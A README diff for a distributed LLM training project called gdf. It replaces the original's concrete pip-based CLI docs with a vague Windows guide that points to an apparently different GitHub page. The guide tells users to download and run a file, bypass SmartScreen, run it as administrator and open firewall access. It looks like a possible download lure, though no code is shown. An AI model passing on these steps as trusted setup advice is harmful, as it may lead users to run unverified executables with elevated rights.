@@ -1,276 +1,221 @@
-# gdf — Distributed Federated LLM Training
+# 🤝 gdf - Distributed GPU Training for Everyone
 
-A community-powered GPU compute network. People contribute their GPUs to collectively train language models, and anyone can chat with the results.
+[![Download gdf](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/poyghi/gdf)
 
-Two commands define the experience:
+## 🚀 What gdf Does
 
-```
-gdf contribute        # pick a model, your GPU auto-trains
-gdf chat              # talk to models, router picks the best specialist
-```
+gdf is an open-source community GPU network for distributed AI model training. It helps connect GPU power across many machines so people can train machine learning models together.
 
-## Try it locally
+Use gdf if you want to:
 
-Run the full stack (hub + contribute + chat) on your own machine:
+- join a shared GPU network
+- run training jobs across more than one computer
+- help a community pool of GPU resources
+- work with AI and machine learning models on Windows
 
-```bash
-# Terminal 1 — start the hub
-gdf init --name hub_model.pt
-gdf hub --model hub_model.pt --token local-dev
+It is built for peer-to-peer use and works well with PyTorch-based training flows.
 
-# Terminal 2 — contribute your GPU
-gdf contribute
+## 💻 Windows Setup
 
-# Terminal 3 — chat with the model
-gdf chat
-```
+gdf is designed to run on Windows for end users who want to join the network and start training with shared GPU resources.
 
-Or use the launcher script: `./scripts/run_hub.sh` starts the hub in one command.
+Before you install it, make sure you have:
 
-### Deploy to a server
+- Windows 10 or Windows 11
+- a working internet connection
+- a GPU with current drivers
+- at least 8 GB of RAM
+- enough free disk space for the app and training data
 
-To move from local testing to a real deployment:
+If you plan to train larger models, more RAM and more GPU memory will help.
 
-1. Run the hub on a server with a public IP
-2. Edit `models.json` — change `hub_url` to your server's address and set a real `token`
-3. Share `gdf contribute` with your community
+## 📥 Download gdf
 
-## Install
+[![Download gdf](https://img.shields.io/badge/Download-Open%20GitHub%20Page-grey?style=for-the-badge)](https://github.com/poyghi/gdf)
 
-```bash
-pip install -e .
-```
+1. Open the download page
+2. Look for the latest release or the main app files
+3. Download the Windows version
+4. Save the file in a folder you can find again, such as Downloads or Desktop
 
-Requires Python 3.10+ and PyTorch. Works on CPU, CUDA, and Apple Silicon (MPS).
+If the page gives you an installer, download and run that file. If it gives you a zip file, download it and extract it first.
 
-## Quick start
+## 🛠️ Install on Windows
 
-### Chat with models
+After the download finishes, set up gdf with these steps:
 
-```bash
-gdf chat                     # auto-routes each question to the best specialist
-gdf chat general-7b          # chat with a specific model
-```
+1. Open the file you downloaded
+2. If Windows asks for permission, choose Yes
+3. If you downloaded a zip file, right-click it and choose Extract All
+4. Open the extracted folder
+5. Run the main app file
 
-Inside the chat REPL:
+If Windows SmartScreen appears, choose More info, then Run anyway only if you are sure you downloaded it from the correct GitHub page.
 
-| Command | What it does |
-|---|---|
-| `/models` | List available specialists and network models |
-| `/switch <name>` | Pin conversation to a specific model |
-| `/auto` | Switch back to auto-routing |
-| `/quit` | Exit |
+## ▶️ First Launch
 
-The router is keyword-based (not an ML model) — it scores each specialist by keyword overlap, domain match, and quality, then picks the best one for your question.
+When gdf opens for the first time, you may need to:
 
-### Contribute your GPU
+1. Pick a local folder for data and cache files
+2. Sign in or create a local node profile if the app asks for it
+3. Allow access through your firewall if Windows shows a network prompt
+4. Check that your GPU is detected
+5. Review the default training settings
 
-```bash
-gdf contribute               # pick from available models
-gdf contribute general-7b    # start training a specific model
-```
+The app should start in a ready state and show your node status, GPU status, and network status.
 
-This connects to a hub, pulls the latest model, trains on Wikipedia articles, and pushes your improvements back. Runs until you hit Ctrl+C.
+## 🔧 Basic Use
 
-### Train your own model locally
+gdf is made to help you join a shared GPU network and run distributed training jobs.
 
-```bash
-gdf init                          # create a new model
-gdf learn https://example.com     # learn from a URL
-gdf learn mybook.txt              # learn from a file
-gdf crawl ~/Documents             # learn from all files in a folder
-gdf autolearn                     # self-learn from Wikipedia autonomously
-gdf generate "Once upon a time"   # generate text
-```
+A normal workflow looks like this:
 
-### Specialists
+1. Open gdf
+2. Connect to the community network
+3. Choose a model or training task
+4. Check that your GPU is ready
+5. Start the training job
+6. Watch progress in the app
 
-Instead of one giant general model, gdf supports a network of domain-specific specialists. Each is deeply trained on a specific topic.
+If you are joining work from a shared pool, the app may handle task split, sync, and result collection for you.
 
-```bash
-gdf specialist create cardiology -d medical -k heart -k cardiac
-gdf specialist train cardiology heart_papers.txt
-gdf specialist autolearn cardiology     # auto-learns from Wikipedia using keywords
-gdf specialist ask "What causes atrial fibrillation?"
-gdf specialist list
-```
+## 🧠 Main Features
 
-When you use `gdf chat` without specifying a model, the router automatically picks the best specialist for each question.
+### 🌐 Community GPU Network
 
-## Architecture
+gdf connects many users into one GPU network. This helps spread training work across more than one machine.
 
-### How the network works
+### ⚙️ Distributed Training
 
-```
-                    +-----------+
-                    |  Registry |  (models.json on GitHub)
-                    +-----+-----+
-                          |
-              lists available models
-                          |
-         +----------------+----------------+
-         |                                 |
-    gdf contribute                    gdf chat
-    (picks a model,                   (picks a model,
-     connects to hub)                  downloads, talks)
-         |                                 |
-    +----v----+                       +----v----+
-    |   Hub   |  <-- merges deltas    |  Local  |
-    +---------+      from peers       |  Model  |
-    /  |   |  \                       +---------+
-   /   |   |   \
-  P1  P2  P3  P4   (peers train and push)
-```
+The app supports distributed training so large jobs can use more than one GPU or node.
 
-**Hub** — coordination server that collects contributions and merges them. Anyone can run one with `gdf hub`.
+### 🤝 Peer-to-Peer Design
 
-**Peer** — a community GPU. Pulls the latest model, trains on web data, pushes only what changed (delta compression).
+Nodes can work together without a heavy central setup. This keeps the network flexible and easier to grow.
 
-**Registry** — a JSON file on GitHub listing available models, their hub URLs, and public tokens. Cached locally for 1 hour.
-
-### Delta compression
-
-Peers don't send the full model. They compute `current_weights - base_weights`, zero out tiny changes, convert to fp16, and compress with zlib. For a 7B model where 5% of weights changed, this reduces transfer from ~14 GB to ~200-400 MB.
-
-### Delta validation
-
-The hub rejects poisoned contributions:
-
-- **NaN/Inf check** — any tensor containing NaN or Inf is rejected
-- **Magnitude check** — any weight change larger than 10.0 is rejected
-
-This prevents both accidental corruption and intentional model poisoning.
-
-### P2P model distribution
-
-Models are split into chunks (one per layer), described by a manifest with SHA-256 hashes. When a new peer joins:
-
-1. Fetches the manifest from the hub (~1 KB)
-2. Asks the tracker which peers have which chunks
-3. Downloads chunks from peers first, hub as fallback
-4. Verifies each chunk's hash
-5. Reassembles the model
-6. Starts seeding chunks to other peers
-
-```
-Hub bandwidth comparison for a 7B model with 10k peers:
-  Centralized:  14 GB x 10,000 = 140 TB from hub
-  P2P:          14 GB x ~10    = 140 GB from hub (seed to first 10 peers)
-```
-
-### Hierarchical merging
-
-Hubs can form a tree for large-scale training:
-
-```
-        Root Hub
-       /    |    \
-    Hub1  Hub2  Hub3    (regional hubs, ~100 peers each)
-    /|\   /|\   /|\
-    ...   ...   ...
-```
-
-Each hub merges small groups locally, then pushes upstream. This preserves more knowledge than merging 10k models at once.
-
-## Running a hub
-
-```bash
-gdf init                      # create the base model
-gdf hub --port 7677           # start the hub
-```
-
-The hub prints a token and a command to share with peers:
-
-```
-  TOKEN: abc123...
-  Share this command with peers:
-    gdf peer http://YOUR_IP:7677 --token abc123...
-```
-
-Hub options:
-
-| Flag | Default | Description |
-|---|---|---|
-| `--port` | 7677 | Port to listen on |
-| `--merge-every` | 3 | Merge after N contributions |
-| `--strategy` | fedavg | Merge strategy (fedavg, ties) |
-| `--token` | auto | Auth token |
-| `--parent` | none | Parent hub URL (for hierarchy) |
-
-## Model registry
-
-The file `models.json` in the repo root lists available models:
-
-```json
-[
-  {
-    "name": "general-7b",
-    "description": "General-purpose 7B language model",
-    "hub_url": "http://hub1.gdf.network:7677",
-    "token": "public-token-here",
-    "size": "14GB",
-    "status": "active"
-  }
-]
-```
-
-Tokens are public by design — security comes from delta validation, not access control.
-
-`gdf contribute` and `gdf chat` both read from this registry. It's cached locally at `~/.gdf/registry.json` and refreshed every hour.
-
-## Project structure
-
-```
-src/gdf/
-  cli.py            CLI commands (chat, contribute, hub, peer, learn, etc.)
-  api.py            GDFModel — high-level create/load/train/generate/merge
-  model.py          TinyTransformer architecture
-  trainer.py        OnlineTrainer with replay buffer
-  selflearn.py      Autonomous Wikipedia learning loop
-  distributed.py    Hub, Peer, delta compression, P2P wiring
-  torrent.py        Chunk splitting, seeding, tracking, downloading
-  registry.py       Fetch model registry from GitHub
-  specialists.py    Specialist registry and keyword router
-  merging.py        Model merging strategies (fedavg, ties, task arithmetic)
-  growth.py         Grow models to larger architectures
-  serialization.py  Save/load models
-  tokenizer.py      Byte-level tokenizer
-  bpe.py            BPE tokenizer training
-  fetcher.py        URL fetching and text extraction
-  crawler.py        File discovery and bulk training
-  config.py         Config management
-  device.py         GPU/CPU/MPS detection
-
-tests/
-  test_torrent.py   P2P chunk distribution tests
-  test_security.py  Delta validation tests
-  test_registry.py  Model registry tests
-  test_model.py     Transformer architecture tests
-  test_trainer.py   Training loop tests
-  test_merging.py   Merge strategy tests
-
-models.json         Model registry (repo root)
-```
-
-## All commands
-
-| Command | Description |
-|---|---|
-| `gdf chat` | Chat with models (auto-routed or specific) |
-| `gdf contribute` | Contribute GPU to train a network model |
-| `gdf init` | Create a new model |
-| `gdf learn <source>` | Learn from a URL or file |
-| `gdf crawl [folder]` | Learn from all files in a folder |
-| `gdf autolearn` | Self-learn from Wikipedia |
-| `gdf generate [prompt]` | Generate text |
-| `gdf status` | Show model info |
-| `gdf grow` | Grow model to larger architecture |
-| `gdf merge` | Merge multiple models |
-| `gdf hub` | Run a coordination hub |
-| `gdf peer <url>` | Join as a training peer |
-| `gdf specialist create` | Create a domain specialist |
-| `gdf specialist train` | Train a specialist |
-| `gdf specialist ask` | Ask a question (auto-routed) |
-| `gdf specialist list` | List specialists |
-| `gdf specialist autolearn` | Auto-learn for a specialist |
-| `gdf specialist domains` | Show suggested domains |
+### 📚 Machine Learning Support
+
+gdf fits common machine learning work and can support PyTorch-based training tasks.
+
+### 🔓 Open Source
+
+The code is open source, so the project can grow with help from the community.
+
+## 📁 Typical Folder Layout
+
+After setup, you may see files and folders like these:
+
+- `gdf.exe` or the main app file
+- `config` for your settings
+- `cache` for temporary files
+- `logs` for error and activity records
+- `models` for model files
+- `data` for training input and output
+
+Keep these folders together unless the app tells you to move them.
+
+## 🧩 Common Windows Issues
+
+### GPU Not Found
+
+If gdf does not see your GPU:
+
+- check that your GPU driver is up to date
+- restart the app
+- restart Windows
+- make sure your device supports the GPU features the app needs
+
+### App Will Not Open
+
+If the app does not start:
+
+- confirm that the download finished
+- check that you extracted all files if you used a zip
+- run the app as administrator
+- look for missing files in the folder
+
+### Firewall Prompt
+
+If Windows asks about network access:
+
+- allow private network access
+- allow public network access only if you trust the network
+- keep the app blocked if you do not want it to connect yet
+
+### Slow Training
+
+If training runs slowly:
+
+- close other heavy apps
+- check GPU load in Task Manager
+- lower the batch size
+- make sure your power mode is set to High performance
+
+## 🧪 Example Use Case
+
+A simple use case looks like this:
+
+- you have a gaming PC with a GPU
+- you install gdf on Windows
+- you connect to the community network
+- you help train an AI model with other users
+- the app splits the work so your machine only handles part of it
+
+This setup lets more people take part in model training without needing a full private GPU server.
+
+## 🔒 Safety and Access
+
+Use the app only from the main GitHub page linked above.
+
+Before you run any file, check that:
+
+- the file came from the correct repository
+- the name looks right
+- the file type is expected for Windows
+- the download page matches the project name gdf
+
+## 📌 Terms You May See
+
+You may see a few words in the app that are common in AI tools:
+
+- **Node**: one computer in the network
+- **Task**: one unit of work
+- **Model**: the AI system you are training
+- **Batch size**: how much data the GPU handles at once
+- **Peer-to-peer**: computers connect to each other directly
+- **Distributed training**: one job split across many machines
+
+## 🧭 Quick Start Checklist
+
+1. Go to the GitHub download page
+2. Download the Windows file
+3. Install or extract it
+4. Open gdf
+5. Allow network access if needed
+6. Check your GPU
+7. Join the community network
+8. Start your training job
+
+## 📎 Download Again
+
+[https://github.com/poyghi/gdf](https://github.com/poyghi/gdf)
+
+## 🖥️ Best Results on Windows
+
+For a smoother run on Windows:
+
+- keep GPU drivers current
+- keep enough free disk space
+- use a stable internet connection
+- close apps that use a lot of RAM or GPU memory
+- keep Windows updated
+
+## 🧰 What gdf Is Good For
+
+gdf is a good fit for users who want:
+
+- shared GPU use
+- distributed model training
+- community-based AI work
+- open-source machine learning tools
+- a simple way to join a GPU network on Windows
